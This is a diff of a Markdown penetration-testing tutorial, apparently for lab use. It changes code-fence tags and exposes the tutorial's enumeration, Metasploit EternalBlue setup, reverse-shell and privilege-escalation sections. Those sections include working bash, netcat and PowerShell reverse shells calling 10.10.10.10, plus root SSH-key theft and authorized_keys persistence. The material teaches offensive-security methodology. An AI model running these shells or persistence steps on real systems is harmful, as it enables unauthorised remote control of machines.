@@ -54,7 +54,7 @@ Service scanning allows us know what applications are running on a computer. The
 
 Nmap (Network Mapper) allows us to scan the target's port numbers or the targets which are present in the network.
 
-```
+```sh
 nmap -sC -sV -v 10.150.150.18
 ```
 
@@ -62,7 +62,7 @@ nmap -sC -sV -v 10.150.150.18
 
 In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version.
 
-```
+```sh
 nmap -sC -sV -v 10.150.150.18
 
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-30 11:44 +08
@@ -87,7 +87,7 @@ Nmap done: 1 IP address (1 host up) scanned in 87.12 seconds
 
 By default, Nmap will only scan the 1,000 most common ports by default. To scan all 65,535 ports, we can use the -p- tag.
 
-```
+```sh
 # Quick scan to see which ports are open
 nmap -p- --min-rate 10000 10.150.150.18 
 
@@ -102,7 +102,7 @@ We are barely scratching the surface!
 
 Rustscan is sometimes preferred for me as it scans faster and its output can serve as a cross-reference to Nmap's.
 
-```
+```sh
 rustscan -a 10.150.150.18 --range 1-65535 --ulimit 5000
 ```
 
@@ -126,11 +126,11 @@ We will be exploring FFUF for this article.
 #### [Ffuf](https://github.com/ffuf/ffuf)
 
 Below is a usage example:
-```
+```sh
 ffuf -w /path/to/wordlist -u https://target/FUZZ
 ```
 
-```
+```sh
 ffuf -u http://10.150.150.18/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 ```
 
@@ -155,15 +155,15 @@ FILTER OPTIONS:
 ##### DNS Subdomain Enumeration
 There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited.
 
-```
+```sh
 curl -s -H "Host: nonexistent.ffuf.io.fi" http://ffuf.io.fi |wc -c
 ```
-```
+```sh
 612   # Received output
 ```
 Filter out responses of length 612
 
-```
+```sh
 ffuf -c -w /path/to/wordlist -u http://ffuf.io.fi -H "Host: FUZZ.ffuf.io.fi" -fs 612
 ```
 
@@ -175,7 +175,7 @@ Be sure to add your newly discovered subdomain to the /etc/hosts file.
 
 We can use cURL to obtain server header information from the command line.
 
-```
+```sh
 curl -IL 10.150.150.18
 ```
 
@@ -183,7 +183,7 @@ curl -IL 10.150.150.18
 
 Whatweb is a command-line tool to help us extract the version of web server, frameworks and technologies used. These can help to narrow down the vulnerabilities which we could exploit.
 
-```
+```sh
 whatweb 10.150.150.18
 ```
 
@@ -206,10 +206,11 @@ We can also utilize online exploit databases such as [ExploitDB](https://www.exp
 ### Searchsploit
 Searchsploit enables us to search for public vulnerabilities/exploits for any application.
 
-```
+```sh
 searchsploit cacti
 ```
-```
+
+```sh
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                                                               |  Path
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -239,15 +240,15 @@ As altering exploits in our local copy of database is discouraged, using the `-m
 ### Metasploit
 Metasploit contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. 
 To run Metasploit, we can use the msfconsole command:
-```
+```sh
 msfconsole
 ```
 
 Once we have Metasploit running, we can search for our target application with the 'search' command.
-```
+```sh
 msf6 > search eternalblue
 ```
-```
+```sh
 Matching Modules
 ================
 
@@ -264,11 +265,11 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 ```
 Once we have identified the exploit we want to use, we can simply key in the command 'use' follow by the number identified for the exploit:
 
-```
+```sh
 use 4
 ```
 Once we have chosen our exploit, we need to configure its options. To view the options available, we can use the 'show options' command:
-```
+```sh
 msf6 exploit(windows/smb/smb_doublepulsar_rce) > show options
 
 Module options (exploit/windows/smb/smb_doublepulsar_rce):
@@ -289,7 +290,7 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
 ```
 Any option with 'Required' set to 'yes' needs to be set for the exploit to work. <br>In this case, we only have two options to set: RHOSTS and LHOST. <br><br>RHOSTS refers to the IP of our target (IP, multiple IPs, or a file containing a list of IPs). LHOST refers to our host machine. <br>They are configured with the `set` command:
 
-```
+```sh
 msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
 RHOSTS => 10.10.10.40
 msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
@@ -300,7 +301,7 @@ LHOST => tun0
 
 Once we have both options set, we can start the exploitation via the `run` or `exploit` command:
 
-```
+```sh
 msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 ```
 
@@ -315,7 +316,7 @@ To achieve reliable and proper communication, we need direct access to our targe
 #### Reverse Shell
 After identifying the vulnerability on our target which allows RCE, we shall first:
 1. Spawn a netcat listener on our machine listening on a specific port (eg. port 9999)
-```
+```sh
 nc -nlvp 9999
 ```
 We now have a netcat listener waiting for a connection. We will trigger the reverse shell connection from the target machine back to our host machine with the netcat listener.
@@ -323,15 +324,15 @@ We now have a netcat listener waiting for a connection. We will trigger the reve
 2. Execute the reverse shell command via the exploited vulnerability
 The command to execute depends on the operating system which our target is running. Some reverse shell commands can be more reliable than others.
 Bash code for Linux compromised hosts:
-```
+```sh
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
 OR
-```
+```sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 Powershell code for Windows compromised hosts
-```
+```sh
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 The key is utilizing the exploit we have over the remote host to execute one of the above reverse shell commands.
@@ -372,20 +373,20 @@ Here are some common ways to escalate current user privileges:
 
 The `sudo` command in Linux allows a user to execute a command as another user (default: superuser), without giving them the identity of the root user. 
 To check the `sudo` privileges we have:
-```
+```sh
 sudo -l
 ```
 If the output allows all commands to be ran with `sudo`, we can subsequently use this command to switch to the root user:
-```
+```sh
 sudo su -
 ```
 However, you may realize that we need a password to run the above command with `sudo`. There are cases where some programs can be executed without having to provide a password:
-```
+```sh
 sudo -l
 (user : user) NOPASSWD: /bin/cat
 ```
 The NOPASSWD entry shows that the /bin/cat command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. To do so, we can specify the user with `-u user`:
-```
+```sh
 sudo -u user /bin/cat random_file.txt
 ```
 Once we find a particular application we can run with sudo, we can look for ways to exploit it to get a shell as the root user.
@@ -399,11 +400,11 @@ An outdated kernel can be targetted by kernel exploits. A target server running 
 Installed software may also pose a threat to target system. To look for installed software on the system:
 
 On Linux, run:
-```
+```sh
 dpkg -l
 ```
 On Windows, look under:
-```
+```sh
 C:\Program Files
 ```
 
@@ -423,7 +424,7 @@ If we can write to a directory called by a cron job, we can write a bash script 
 
 ##### Exposed Credentials
 Exposed credentials are common in configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). These credentials might be reused which allows us to switch to that user using the same password:
-```
+```sh
 $ su -
 
 Password: 123456
@@ -435,7 +436,7 @@ or SSH into the target machine as that user.
 
 ##### SSH Keys
 If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:
-```
+```sh
 $ vim id_rsa
 $ chmod 600 id_rsa
 $ ssh user@10.10.10.10 -i id_rsa
@@ -443,15 +444,15 @@ $ ssh user@10.10.10.10 -i id_rsa
 root@remotehost#
 ```
 If we find ourselves with write access to a users `/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:
-```
+```sh
 $ ssh-keygen -f key
 ```
 This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
-```
+```sh
 $ echo "ssh-rsa AAAAB...SNIP...M= user@ownmachine" >> /root/.ssh/authorized_keys
 ```
 Now, the remote server should allow us to log in as that user by using our private key:
-```
+```sh
 $ ssh root@10.10.10.10 -i key
 
 root@remotehost#
